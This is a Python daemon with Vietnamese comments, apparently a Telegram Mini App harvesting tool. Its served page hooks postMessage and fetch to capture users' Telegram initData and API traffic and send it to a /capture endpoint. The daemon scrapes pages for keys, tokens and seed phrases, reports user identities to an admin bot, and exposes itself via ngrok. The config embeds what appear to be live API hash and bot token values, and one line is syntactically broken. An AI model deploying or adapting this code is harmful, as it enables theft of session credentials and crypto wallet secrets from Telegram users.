# ============================================================
# TÊN: Mini App 24/7 Auto Scanner - Persistent Daemon
# TÁC GIẢ: Palo - Mô-đun giám sát liên tục 24/7
# MÔ TẢ: Script chạy vĩnh viễn 24/7: Login Telegram ->
#        Mở Web -> Bắt Mini App -> Parse initData ->
#        Quét API -> Gửi báo cáo Telegram Admin.
#        Tự động restart khi crash, auto reconnect.
# YÊU CẦU: pip install flask flask-sock pyrogram tgcrypto
#          aiohttp beautifulsoup4 lxml colorama requests
#          selenium-wire pyngrok
# ============================================================

import asyncio
import json
import re
import os
import sys
import time
import signal
import traceback
import threading
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any
from urllib.parse import urlparse, parse_qs, unquote, urljoin
from pathlib import Path

from flask import Flask, request, jsonify, render_template_string
from flask_sock import Sock
import requests
from colorama import Fore, Style, init
from bs4 import BeautifulSoup
import aiohttp
from pyrogram import Client
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import FloodWait, RPCError, Unauthorized

# ============================================================
# KHỞI TẠO COLORAMA
# ============================================================
init(autoreset=True)

# ============================================================
# CẤU HÌNH 24/7
# ============================================================
CONFIG = {
    # ========== TELEGRAM ==========
    "api_id": 27657608,              # THAY BẰNG API_ID
    "api_hash": "3b6e52a3713b44ad5adaa2bcf579de66",     # THAY BẰNG API_HASH
    "bot_token": "8515267798:AAEUWB-9qZFcW2ZcDwbaLg8Vi0CtrrUO4gE",   # THAY BẰNG BOT TOKEN
    "admin_id": 5736655322,           # THAY BẰNG ID TELEGRAM CỦA BẠN

    # ========== SESSION STRING (Để auto login 24/7) ==========
    # Nếu có session string, bot sẽ dùng thay vì login lại
    "session_string": "",            # Để trống nếu chưa có

    # ========== FLASK SERVER ==========
    "flask_host": "0.0.0.0",
    "flask_port": 8888,

    # ========== NGROK (Public URL 24/7) ==========
    "use_ngrok": True,
    "ngrok_auth_token": "",

    # ========== SCAN 24/7 ==========
    "scan_interval_seconds": 5,      # Quét mỗi 5 giây
    "heartbeat_interval": 300,       # Gửi heartbeat mỗi 5 phút
    "auto_restart": True,            # Tự động restart khi crash
    "max_restart_attempts": 50,      # Số lần restart tối đa
    "restart_delay": 10,             # Delay giữa các lần restart

    # ========== OUTPUT ==========
    "output_dir": "mini_app_247_data",

    # ========== TARGET URLS (Web cần giám sát) ==========
    "target_urls": [
        # Thêm URL cần giám sát 24/7 ở đây
        # "https://example.com/mini-app",
    ],

    # ========== PROXY (Tùy chọn) ==========
    "proxy": None,  # "http://user:pass@ip:port"
}

# ============================================================
# TẠO THƯ MỤC
# ============================================================
os.makedirs(CONFIG["output_dir"], exist_ok=True)
os.makedirs(os.path.join(CONFIG["output_dir"], "scans"), exist_ok=True)
os.makedirs(os.path.join(CONFIG["output_dir"], "logs"), exist_ok=True)

# ============================================================
# LOGGER 24/7
# ============================================================
class Logger:
    """Logger ghi file + console"""

    def __init__(self, name: str):
        self.name = name
        self.log_file = os.path.join(
            CONFIG["output_dir"], "logs",
            f"{name}_{datetime.now().strftime('%Y%m%d')}.log"
        )

    def _log(self, level: str, color: str, msg: str):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        line = f"[{timestamp}] [{level}] [{self.name}] {msg}"
        # Console
        print(f"{color}{line}{Style.RESET_ALL}")
        # File
        try:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(line + "\n")
        except:
            pass

    def info(self, msg: str):
        self._log("INFO", Fore.CYAN, msg)

    def success(self, msg: str):
        self._log("SUCCESS", Fore.GREEN, msg)

    def warning(self, msg: str):
        self._log("WARNING", Fore.YELLOW, msg)

    def error(self, msg: str):
        self._log("ERROR", Fore.RED, msg)

    def critical(self, msg: str):
        self._log("CRITICAL", Fore.MAGENTA, msg)

logger = Logger("MainDaemon")

# ============================================================
# PATTERN REGEX
# ============================================================
PATTERNS = {
    "mini_app_url": re.compile(
        r'(https?://[^\s"\'<>]+?(?:mini|app|webapp|game|clicker|tap|earn|'
        r'quest|task|airdrop|bot|ton|connect|wallet|dex|swap|stake|farm|'
        r'mint|bridge|launchpad)[^\s"\'<>]*)',
        re.IGNORECASE
    ),
    "api_endpoint": re.compile(
        r'["\'`](https?://[^\s"\'<>`]+?/(?:api|graphql|query|data|user|auth|'
        r'login|session|token|verify|check|submit|claim|earn|tap|upgrade|'
        r'boost|referral|leaderboard|task|mission|reward|balance|wallet|'
        r'exchange|swap|pool|stake|farm|harvest|withdraw|deposit|'
        r'callback|webhook|event|notification)[^\s"\'<>`]*)["\'`]',
        re.IGNORECASE
    ),
    "token_pattern": re.compile(r'\b(\d{8,10}:[A-Za-z0-9\-_]{35})\b'),
    "sensitive_data": re.compile(
        r'(api[_-]?key|secret|token|password|private[_-]?key|mnemonic|'
        r'seed|phrase|auth[_-]?token|bearer|jwt)["\s:=]+([A-Za-z0-9\-_+/=]{20,})',
        re.IGNORECASE
    ),
}

# ============================================================
# LỚP 1: TELEGRAM BOT CLIENT 24/7
# ============================================================
class TeleBot247:
    """Bot Telegram chạy 24/7, gửi báo cáo cho Admin"""

    def __init__(self):
        self.client = None
        self.is_connected = False
        self.last_heartbeat = None
        self.message_queue = asyncio.Queue(maxsize=500)
        self.admin_id = CONFIG["admin_id"]

    async def start(self):
        """Khởi động bot, thử session string trước"""
        try:
            if CONFIG.get("session_string"):
                logger.info("Đang thử đăng nhập bằng session string...")
                self.client = Client(
                    "bot_247_session",
                    api_id=CONFIG["api_id"],
                    api_hash=CONFIG["api_hash"],
                    session_string=CONFIG["session_string"],
                    in_memory=False,
                    workdir=CONFIG["output_dir"]
                )
            else:
                logger.info("Đang đăng nhập bằng bot token...")
                self.client = Client(
                    "bot_247_token",
                    api_id=CONFIG["api_id"],
                    api_hash=CONFIG["api_hash"],
                    bot_token=CONFIG["bot_token"],
                    in_memory=False,
                    workdir=CONFIG["output_dir"]
                )

            await self.client.start()
            self.is_connected = True

            # Lấy thông tin bot
            me = await self.client.get_me()
            logger.success(f"Bot đã kết nối: @{me.username} (ID: {me.id})")

            # Gửi thông báo khởi động cho Admin
            await self.send_admin_message(
                f"🟢 **24/7 Scanner Đã Khởi Động**\n"
                f"Thời gian: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
                f"Bot: @{me.username}\n"
                f"Target URLs: {len(CONFIG['target_urls'])}\n"
                f"Scan Interval: {CONFIG['scan_interval_seconds']}s"
            )

            # Bắt đầu worker xử lý hàng đợi tin nhắn
            asyncio.create_task(self._message_worker())
            # Bắt đầu heartbeat
            asyncio.create_task(self._heartbeat_loop())

            return True
        except Exception as e:
            logger.critical(f"Không thể khởi động bot: {e}")
            return False

    async def _message_worker(self):
        """Worker xử lý hàng đợi gửi tin nhắn"""
        while self.is_connected:
            try:
                message_data = await asyncio.wait_for(
                    self.message_queue.get(), timeout=30
                )
                await self._send_message_safe(
                    message_data["chat_id"],
                    message_data["text"],
                    message_data.get("parse_mode", "HTML"),
                    message_data.get("reply_markup"),
                    message_data.get("retry", 3)
                )
            except asyncio.TimeoutError:
                continue
            except Exception as e:
                logger.error(f"Message worker error: {e}")

    async def _send_message_safe(self, chat_id: int, text: str, parse_mode: str = "HTML",
                                  reply_markup=None, retry: int = 3):
        """Gửi tin nhắn an toàn với retry"""
        for attempt in range(retry):
            try:
                await self.client.send_message(
                    chat_id=chat_id,
                    text=text,
                    parse_mode=parse_mode,
                    reply_markup=reply_markup,
                    disable_web_page_preview=True
                )
                return True
            except FloodWait as e:
                logger.warning(f"Flood wait {e.value}s, đang đợi...")
                await asyncio.sleep(e.value)
            except Unauthorized:
                logger.critical("Bot bị unauthorize, dừng gửi tin nhắn")
                return False
            except Exception as e:
                if attempt < retry - 1:
                    logger.warning(f"Gửi tin nhắn thất bại (attempt {attempt+1}): {e}")
                    await asyncio.sleep(2 ** attempt)
                else:
                    logger.error(f"Không thể gửi tin nhắn sau {retry} lần: {e}")
                    return False
        return False

    async def send_admin_message(self, text: str, parse_mode: str = "HTML",
                                  reply_markup=None):
        """Gửi tin nhắn cho Admin"""
        await self.message_queue.put({
            "chat_id": self.admin_id,
            "text": text,
            "parse_mode": parse_mode,
            "reply_markup": reply_markup,
        })

    async def _heartbeat_loop(self):
        """Gửi heartbeat định kỳ cho Admin"""
        while self.is_connected:
            await asyncio.sleep(CONFIG["heartbeat_interval"])
            if self.is_connected:
                stats = get_global_stats()
                heartbeat_msg = (
                    f"💓 **Heartbeat**\n"
                    f"Thời gian: `{datetime.now().strftime('%H:%M:%S')}`\n"
                    f"Uptime: `{stats['uptime']}`\n"
                    f"Mini Apps bắt được: `{stats['mini_apps_captured']}`\n"
                    f"API Endpoints: `{stats['api_endpoints_found']}`\n"
                    f"Lỗi: `{stats['errors']}`"
                )
                await self.send_admin_message(heartbeat_msg)

    async def stop(self):
        """Dừng bot"""
        if self.client:
            self.is_connected = False
            try:
                await self.send_admin_message("🔴 **24/7 Scanner Đã Dừng**")
                await asyncio.sleep(1)
                await self.client.stop()
            except:
                pass

# ============================================================
# LỚP 2: PHÂN TÍCH INIT DATA
# ============================================================
class InitDataParser:
    """Parse initData Telegram"""

    @staticmethod
    def parse(init_data_raw: str) -> Dict:
        if not init_data_raw:
            return {}
        try:
            params = parse_qs(init_data_raw)
            parsed = {}
            for key, value in params.items():
                if key in ["user", "receiver", "chat"]:
                    try:
                        parsed[key] = json.loads(unquote(value[0]))
                    except:
                        parsed[key] = value[0]
                else:
                    parsed[key] = value[0] if len(value) == 1 else value
            return parsed
        except:
            return {"raw": init_data_raw[:500]}

    @staticmethod
    def extract_user(parsed_data: Dict) -> Dict:
        user = parsed_data.get("user", {})
        return {
            "user_id": user.get("id"),
            "first_name": user.get("first_name"),
            "last_name": user.get("last_name"),
            "username": user.get("username"),
            "is_premium": user.get("is_premium"),
        }

# ============================================================
# LỚP 3: QUÉT MINI APP
# ============================================================
class MiniAppScanner:
    """Quét Mini App API"""

    async def scan(self, url: str, init_data: Optional[str] = None) -> Dict:
        result = {
            "url": url,
            "time": datetime.now().isoformat(),
            "accessible": False,
            "status_code": None,
            "title": None,
            "api_endpoints": [],
            "sensitive_data": [],
            "error": None,
        }
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
            }
            if init_data:
                headers["X-Telegram-Init-Data"] = init_data

            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    result["status_code"] = resp.status
                    result["accessible"] = resp.status == 200
                    if resp.status == 200:
                        text = await resp.text()
                        soup = BeautifulSoup(text, "lxml")
                        title_tag = soup.find("title")
                        result["title"] = title_tag.text.strip() if title_tag else None

                        # Tìm API endpoints
                        for script in soup.find_all("script"):
                            if script.string:
                                endpoints = PATTERNS["api_endpoint"].findall(script.string)
                                result["api_endpoints"].extend(endpoints)
                                sensitive = PATTERNS["sensitive_data"].findall(script.string)
                                result["sensitive_data"].extend([
                                    {"type": s[0], "value": s[1][:40]} for s in sensitive
                                ])

                        result["api_endpoints"] = list(set(result["api_endpoints"]))
                        result["sensitive_data"] = result["sensitive_data"][:10]
        except Exception as e:
            result["error"] = str(e)
        return result

# ============================================================
# LỚP 4: WEB INTERCEPT SERVER
# ============================================================
class WebInterceptServer:
    """Server Flask nhận dữ liệu từ web"""

    def __init__(self, data_queue: asyncio.Queue, bot: TeleBot247):
        self.app = Flask(__name__)
        self.sock = Sock(self.app)
        self.data_queue = data_queue
        self.bot = bot
        self.setup_routes()

    def setup_routes(self):
        @self.app.route("/")
        def index():
            return render_template_string(HTML_INJECT_PAGE)

        @self.app.route("/capture", methods=["POST"])
        def capture():
            try:
                data = request.get_json(force=True) or {}
                # Đưa vào queue xử lý async
                loop = asyncio.new_event_loop()
                asyncio.run_coroutine_threadsafe(
                    self.data_queue.put(data), loop
                )
                return jsonify({"status": "ok"})
            except Exception as e:
                return jsonify({"status": "error", "message": str(e)}), 500

        @self.app.route("/health")
        def health():
            return jsonify({
                "status": "running",
                "time": datetime.now().isoformat(),
                "queue_size": self.data_queue.qsize(),
            })

    def run(self):
        """Chạy Flask server trong thread riêng"""
        def _run():
            from waitress import serve
            logger.info(f"Web server đang chạy tại http://{CONFIG['flask_host']}:{CONFIG['flask_port']}")
            serve(self.app, host=CONFIG["flask_host"], port=CONFIG["flask_port"])
        thread = threading.Thread(target=_run, daemon=True)
        thread.start()

# ============================================================
# HTML INJECT PAGE
# ============================================================
HTML_INJECT_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Mini App Scanner - Active</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
        .container { max-width: 800px; margin: 0 auto; }
        .header { text-align: center; padding: 20px; border-bottom: 1px solid #00ff00; margin-bottom: 20px; }
        .status { padding: 15px; background: #111; border-radius: 5px; margin-bottom: 20px; }
        .log { height: 400px; overflow-y: auto; background: #000; padding: 15px; border-radius: 5px; font-size: 12px; }
        .log-entry { margin-bottom: 5px; }
        .success { color: #00ff00; }
        .warning { color: #ffff00; }
        .error { color: #ff0000; }
        .info { color: #00ffff; }
        .badge { display: inline-block; padding: 3px 8px; background: #00ff00; color: #000; border-radius: 3px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔍 Mini App 24/7 Scanner</h1>
            <p class="info">Status: <span class="badge" id="status">ACTIVE</span></p>
            <p>Session: <span id="session-id">-</span></p>
        </div>
        <div class="status">
            <p>📊 <strong>Statistics</strong></p>
            <p>Mini Apps Captured: <span id="count-apps">0</span></p>
            <p>API Endpoints Found: <span id="count-apis">0</span></p>
            <p>Last Capture: <span id="last-capture">-</span></p>
        </div>
        <div class="log" id="log-container">
            <div class="log-entry info">[SYSTEM] Scanner initialized. Waiting for Mini Apps...</div>
        </div>
    </div>

    <script>
        const SERVER_URL = window.location.origin;
        const LOG = document.getElementById('log-container');
        let stats = { apps: 0, apis: 0 };

        function addLog(msg, type='info') {
            const entry = document.createElement('div');
            entry.className = `log-entry ${type}`;
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
            LOG.appendChild(entry);
            LOG.scrollTop = LOG.scrollHeight;
        }

        function updateStats() {
            document.getElementById('count-apps').textContent = stats.apps;
            document.getElementById('count-apis').textContent = stats.apis;
            document.getElementById('last-capture').textContent = new Date().toLocaleTimeString();
        }

        // Intercept Telegram WebApp
        const originalPostMessage = window.postMessage;
        window.postMessage = function(data, origin) {
            try {
                if (data && typeof data === 'string' && data.includes('tgWebAppData')) {
                    const initData = data.split('tgWebAppData=')[1]?.split('&')[0];
                    if (initData) {
                        fetch(SERVER_URL + '/capture', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                type: 'initData_intercepted',
                                initData: decodeURIComponent(initData),
                                url: window.location.href,
                                timestamp: new Date().toISOString()
                            })
                        });
                        stats.apps++;
                        updateStats();
                        addLog('🎯 Intercepted Telegram Mini App initData!', 'success');
                    }
                }
            } catch(e) {
                addLog('Error: ' + e.message, 'error');
            }
            return originalPostMessage.call(this, data, origin);
        };

        // Monitor network requests
        const originalFetch = window.fetch;
        window.fetch = function(url, options) {
            const urlStr = typeof url === 'string' ? url : url.url;
            if (urlStr && (urlStr.includes('/api/') || urlStr.includes('graphql') || urlStr.includes('query'))) {
                fetch(SERVER_URL + '/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'api_request_detected',
                        url: urlStr,
                        method: options?.method || 'GET',
                        page_url: window.location.href,
                        timestamp: new Date().toISOString()
                    })
                });
                stats.apis++;
                updateStats();
                addLog('📡 API Request: ' + urlStr.substring(0, 80), 'warning');
            }
            return originalFetch.call(this, url, options);
        };

        // Monitor WebSocket connections
        const originalWebSocket = window.WebSocket;
        window.WebSocket = function(url, protocols) {
            const ws = new originalWebSocket(url, protocols);
            addLog('🔌 WebSocket: ' + url.substring(0, 60), 'info');
            return ws;
        };

        addLog('✅ Interceptors installed successfully', 'success');
        document.getElementById('session-id').textContent = Math.random().toString(36).substring(7);

        // Keep-alive ping
        setInterval(() => {
            fetch(SERVER_URL + '/health').then(r => r.json()).then(d => {
                document.getElementById('status').textContent = d.status === 'running' ? 'ACTIVE' : 'ERROR';
            }).catch(() => {
                document.getElementById('status').textContent = 'DISCONNECTED';
            });
        }, 30000);
    </script>
</body>
</html>
"""

# ============================================================
# THỐNG KÊ TOÀN CỤC
# ============================================================
global_stats = {
    "start_time": datetime.now(),
    "mini_apps_captured": 0,
    "api_endpoints_found": 0,
    "errors": 0,
    "last_capture": None,
}

def get_global_stats() -> Dict:
    stats = global_stats.copy()
    stats["uptime"] = str(datetime.now() - stats["start_time"]).split(".")[0]
    return stats

# ============================================================
# LỚP CHÍNH: DAEMON 24/7
# ============================================================
class Daemon247:
    """Daemon chính chạy 24/7"""

    def __init__(self):
        self.bot = TeleBot247()
        self.scanner = MiniAppScanner()
        self.parser = InitDataParser()
        self.data_queue = asyncio.Queue(maxsize=2000)
        self.web_server = WebInterceptServer(self.data_queue, self.bot)
        self.is_running = False
        self.restart_count = 0

    async def start(self):
        """Khởi động toàn bộ hệ thống"""
        logger.info("═══════════════════════════════════════")
        logger.info("  MINI APP 24/7 SCANNER - STARTING")
        logger.info("═══════════════════════════════════════")

        # Bước 1: Khởi động bot Telegram
        bot_started = await self.bot.start()
        if not bot_started:
            logger.critical("Không thể khởi động bot, thoát!")
            return False

        # Bước 2: Khởi động web server
        self.web_server.run()
        logger.success("Web server đã khởi động")

        # Bước 3: Bắt đầu worker xử lý dữ liệu
        asyncio.create_task(self._data_processor())
        logger.success("Data processor đã khởi động")

        # Bước 4: Bắt đầu scanner định kỳ nếu có target URLs
        if CONFIG["target_urls"]:
            asyncio.create_task(self._periodic_scanner())
            logger.success(f"Periodic scanner đã khởi động ({len(CONFIG['target_urls'])} URLs)")

        self.is_running = True
        logger.success("✅ TẤT CẢ HỆ THỐNG ĐÃ SẴN SÀNG - 24/7 MODE")

        return True

    async def _data_processor(self):
        """Worker chính xử lý dữ liệu từ web capture"""
        while self.is_running:
            try:
                data = await asyncio.wait_for(self.data_queue.get(), timeout=30)

                data_type = data.get("type", "unknown")
                logger.info(f"Nhận dữ liệu: {data_type}")

                if data_type == "initData_intercepted":
                    await self._process_init_data(data)
                elif data_type == "api_request_detected":
                    await self._process_api_request(data)
                else:
                    # Lưu vào file
                    self._save_raw_data(data)

                global_stats["last_capture"] = datetime.now().isoformat()

            except asyncio.TimeoutError:
                continue
            except Exception as e:
                logger.error(f"Data processor error: {e}")
                global_stats["errors"] += 1

    async def _process_init_data(self, data: Dict):
        """Xử lý initData bắt được"""
        init_data_raw = data.get("initData", "")
        page_url = data.get("url", "")

        if not init_data_raw:
            return

        # Parse initData
        parsed = self.parser.parse(init_data_raw)
        user_info = self.parser.extract_user(parsed)

        global_stats["mini_apps_captured"] += 1

        # Lưu vào file
        self._save_capture({
            "type": "initData",
            "url": page_url,
            "parsed": parsed,
            "user": user_info,
            "raw_init_data": init_data_raw[:1000],
        })

        # Quét Mini App nếu có URL
        scan_result = None
        if page_url and page_url.startswith("http"):
            scan_result = await self.scanner.scan(page_url, init_data_raw)
            global_stats["api_endpoints_found"] += len(scan_result.get("api_endpoints", []))
            self._save_capture({
                "type": "scan_result",
                "url": page_url,
                "scan": scan_result,
            })

        # Format và gửi báo cáo cho Admin
        report = self._format_report(user_info, parsed, page_url, scan_result)
        await self.bot.send_admin_message(report)

    async def _process_api_request(self, data: Dict):
        """Xử lý API request bắt được"""
        api_url = data.get("url", "")
        page_url = data.get("page_url", "")

        global_stats["api_endpoints_found"] += 1

        # Lưu endpoint
        self._save_capture({
            "type": "api_endpoint",
            "url": api_url,
            "page_url": page_url,
            "method": data.get("method", "GET"),
        })

        # Gửi cho Admin nếu quan trọng
        if any(kw in api_url.lower() for kw in ["auth", "login", "token", "wallet", "balance"]):
            await self.bot.send_admin_message(
                f"🔑 **API Quan Trọng Phát Hiện**\n"
                f"URL: `{api_url[:200]}`\n"
                f"Page: `{page_url[:100]}`\n"
                f"Method: `{data.get('method', 'GET')}`"
            )

    async def _periodic_scanner(self):
        """Quét định kỳ các target URLs"""
        while self.is_running:
            for url in CONFIG["target_urls"]:
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                            if resp.status == 200:
                                text = await resp.text()
                                # Tìm Mini App URLs trong response
                                mini_apps = PATTERNS["mini_app_url"].findall(text)
                                for app_url in set(mini_apps):
                                    await self.data_queue.put({
                                        "type": "url_discovered",
                                        "url": app_url,
                                        "source_url": url,
                                        "timestamp": datetime.now().isoformat(),
                                    })
                except:
                    pass
            await asyncio.sleep(CONFIG["scan_interval_seconds"])

    def _format_report(self, user_info: Dict, parsed: Dict, url: str, scan: Optional[Dict]) -> str:
        """Format báo cáo gửi Admin"""
        user_str = (
            f"👤 **User:** {user_info.get('first_name', 'N/A')} {user_info.get('last_name', '')}\n"
            f"   ID: `{user_info.get('user_id', 'N/A')}`\n"
            f"   Username: @{user_info.get('username', 'N/A')}\n"
            f"   Premium: {'⭐ Có' if user_info.get('is_premium') else 'Không'}"
        )

        url_str = f"🌐 **URL:** `{url[:150]}`" if url else ""

        scan_str = ""
        if scan:
            scan_str = (
                f"\n📊 **Scan Kết Quả:**\n"
                f"   Status: `{scan.get('status_code', 'N/A')}`\n"
                f"   Title: `{scan.get('title', 'N/A')}`\n"
                f"   API Endpoints: `{len(scan.get('api_endpoints', []))}`\n"
                f"   Sensitive Data: `{len(scan.get('sensitive_data', []))}`"
            )
            if scan.get("api_endpoints"):
                top_endpoints = "\n".join([f"   • `{e[:100]}`" for e in scan["api_endpoints"][:5]])
                scan_str += f"\n   **Top Endpoints:**\n{top_endpoints}"

        time_str = f"\n⏰ **Thời gian:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"

        return f"🎯 **MINI APP CAPTURED**\n{user_str}\n{url_str}{scan_str}{time_str}"

    def _save_capture(self, data: Dict):
        """Lưu dữ liệu vào file JSON"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
            filename = os.path.join(CONFIG["output_dir"], "scans", f"capture_{timestamp}.json")
            with open(filename, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False, default=str)
        except Exception as e:
            logger.error(f"Lỗi lưu file: {e}")

    def _save_raw_data(self, data: Dict):
        """Lưu dữ liệu thô"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
            filename = os.path.join(CONFIG["output_dir"], "scans", f"raw_{timestamp}.json")
            with open(filename, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False, default=str)
        except:
            pass

    async def stop(self):
        """Dừng toàn bộ hệ thống"""
        logger.warning("Đang dừng hệ thống...")
        self.is_running = False
        await self.bot.stop()
        logger.info("Hệ thống đã dừng")

# ============================================================
# AUTO RESTART WRAPPER
# ============================================================
async def run_with_auto_restart():
    """Chạy daemon với auto restart"""
    daemon = None
    restart_count = 0

    while restart_count < CONFIG["max_restart_attempts"]:
        try:
            daemon = Daemon247()
            success = await daemon.start()

            if not success:
                logger.critical("Không thể khởi động, thử lại...")
                restart_count += 1
                await asyncio.sleep(CONFIG["restart_delay"])
                continue

            # Giữ daemon chạy
            while daemon.is_running:
                await asyncio.sleep(1)

        except KeyboardInterrupt:
            logger.warning("Nhận tín hiệu dừng từ người dùng")
            if daemon:
                await daemon.stop()
            break

        except Exception as e:
            logger.critical(f"CRASH: {e}")
            logger.critical(traceback.format_exc())
            restart_count += 1

            if daemon:
                try:
                    await daemon.stop()
                except:
                    pass            if CONFIG["auto_restart"] and restart_count < CONFIG["max_restart_attempts"]:
                logger.warning(f"Tự động restart sau {CONFIG['restart_delay']}s (lần {restart_count}/{CONFIG['max_restart_attempts']})")
                await asyncio.sleep(CONFIG["restart_delay"])
            else:
                logger.critical("Đã đạt giới hạn restart, thoát!")
                break

    logger.info("Chương trình kết thúc")

# ============================================================
# MAIN ENTRY POINT
# ============================================================
if __name__ == "__main__":
    print(f"""{Fore.MAGENTA}
╔══════════════════════════════════════════════╗
║     MINI APP 24/7 AUTO SCANNER              ║
║     Persistent Daemon with Auto Restart     ║
║     Login -> Scan -> Report -> Telegram     ║
║              Powered by Palo                ║
╚══════════════════════════════════════════════╝
{Style.RESET_ALL}""")

    # Kiểm tra config
    if CONFIG["api_id"] == 12345678:
        print(f"{Fore.RED}[ERROR] Vui lòng thay API_ID và API_HASH trong CONFIG!")
        sys.exit(1)

    if CONFIG["bot_token"] == "YOUR_BOT_TOKEN":
        print(f"{Fore.RED}[ERROR] Vui lòng thay BOT_TOKEN trong CONFIG!")
        sys.exit(1)

    if CONFIG["admin_id"] == 123456789:
        print(f"{Fore.RED}[ERROR] Vui lòng thay ADMIN_ID (ID Telegram của bạn) trong CONFIG!")
        sys.exit(1)

    print(f"{Fore.GREEN}[READY] Nhấn Ctrl+C để dừng bất cứ lúc nào")
    print(f"{Fore.CYAN}[INFO] Admin ID: {CONFIG['admin_id']}")
    print(f"{Fore.CYAN}[INFO] Scan interval: {CONFIG['scan_interval_seconds']}s")
    print(f"{Fore.CYAN}[INFO] Heartbeat: mỗi {CONFIG['heartbeat_interval']}s")
    print(f"{Fore.CYAN}[INFO] Auto restart: {'BẬT' if CONFIG['auto_restart'] else 'TẮT'}")
    print()

    # Chạy với event loop riêng
    try:
        asyncio.run(run_with_auto_restart())
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Đã dừng bởi người dùng{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}FATAL: {e}{Style.RESET_ALL}")
